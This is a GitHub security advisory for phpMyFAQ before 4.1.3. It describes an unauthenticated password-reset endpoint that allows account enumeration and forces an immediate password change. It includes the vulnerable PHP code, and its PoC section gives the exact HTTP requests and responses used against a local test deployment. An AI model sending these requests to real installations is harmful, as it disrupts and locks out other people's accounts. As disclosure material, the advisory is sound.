# [H] phpMyFAQ: Unauthenticated Password Reset Endpoint Allows User Enumeration and Forced Password Change Without Token Validation

## Summary
Severity: High
Advisory: GHSA-9qv9-8xv6-5p35
CVE: CVE-2026-35676
CWE: CWE-640
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-05-20
Source: https://github.com/advisories/GHSA-9qv9-8xv6-5p35
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.3
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.3

## Details
### Summary

The password reset API can be triggered without authentication and without any out-of-band confirmation step.

If an attacker knows a valid `username + email` pair, they can call the reset endpoint directly. The application immediately generates a new password, writes it to the account, and only then sends the new password by email.

This creates two issues at the same time:

- account enumeration through the response difference between valid and invalid pairs
- forced password reset of another user's account, which invalidates the old password immediately

In my local reproduction, I confirmed both the response difference and the password change itself.

### Details

The relevant code is in `phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/UnauthorizedUserController.php`.

The route is exposed without authentication:

```php
#[Route(path: 'user/password/update', name: 'api.private.user.password', methods: ['PUT'])]
public function updatePassword(Request $request): JsonResponse
```

The flow is straightforward:

```php
$loginExist = $user->getUserByLogin($username);

if ($loginExist && $email === $user->getUserData('email')) {
    $newPassword = $user->createPassword();
    $user->changePassword($newPassword);
    $mail->send();
    return $this->json(['success' => Translation::get(key: 'lostpwd_mail_okay')], Response::HTTP_OK);
}

return $this->json(['error' => Translation::get(key: 'lostpwd_err_1')], Response::HTTP_CONFLICT);
```

The core issue is that the password is changed immediately after a simple username and email match. There is no reset token, no confirmation link, no second step, and no requirement that the caller prove control of the mailbox before the password is replaced.

That means the endpoint is not just a "forgot password email sender". It is an actual unauthenticated password change trigger.

### PoC

This was reproduced against a local Docker deployment of the project.

For a valid username and email pair:

```http
PUT /api/index.php/user/password/update HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json

{"username":"user1","email":"user1@example.com"}
```

Response:

```http
HTTP/1.0 200 OK
Content-Type: application/json

{"success":"Email has been sent."}
```

For an invalid pair:

```http
PUT /api/index.php/user/password/update HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json

{"username":"user1","email":"wrong@example.com"}
```

Response:

```http
HTTP/1.0 409 Conflict
Content-Type: application/json

{"error":"Error: Username and email address not found."}
```

That already confirms enumeration.

To verify that the password really changes, created a test account:

- username: `user2`
- password: `Oldpass123!`
- email: `user2@example.com`

Before calling the endpoint, the password hash stored in `faquserlogin` was:

```text
481bf096fd16e68ebbb8b98368bc0b5c17631a00f01a36dbb4a8dade0f0b8125
```

Then send:

```http
PUT /api/index.php/user/password/update HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json

{"username":"user2","email":"user2@example.com"}
```

The response was:

```http
HTTP/1.0 200 OK
Content-Type: application/json

{"success":"Email has been sent."}
```

After that, the stored hash changed to:

```text
3497f20c251da705f673dcac500fbf9e2e2e495719a7e2df9be08db42bf1286f
```

Then try to log in with the old password:

```http
POST /authenticate HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

faqusername=user2&faqpassword=Oldpass123!
```

The application redirected back to the login page and reported that the password was incorrect.

So this is not just a cosmetic issue in the API response. The old credential really becomes invalid.

### Impact

The most realistic impact here is forced password reset and account disruption.

An attacker who knows or can guess a valid username and email pair can:

- confirm whether the pair is valid
- force the target account's password to change
- cause the victim's old password to stop working immediately

If the attacker does not control the victim's mailbox, this is usually a denial-of-service style account disruption rather than instant account takeover. That is the main reason I would keep the severity at **Medium**.

Even so, this is still a real security issue. Password recovery should not allow an unauthenticated caller to change the account password directly.

### Remediation

Recommend to change the password recovery flow to a token-based design.

1. Do not change the password inside the unauthenticated endpoint.
2. Generate a short-lived, single-use reset token and send only the reset link by email.
3. Return the same generic response for both valid and invalid username/email pairs.
4. Keep rate limiting in place, but do not rely on it as the main protection.
5. Add regression tests that verify the password hash does not change until a valid reset token is presented.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9qv9-8xv6-5p35
- https://github.com/thorsten/phpMyFAQ
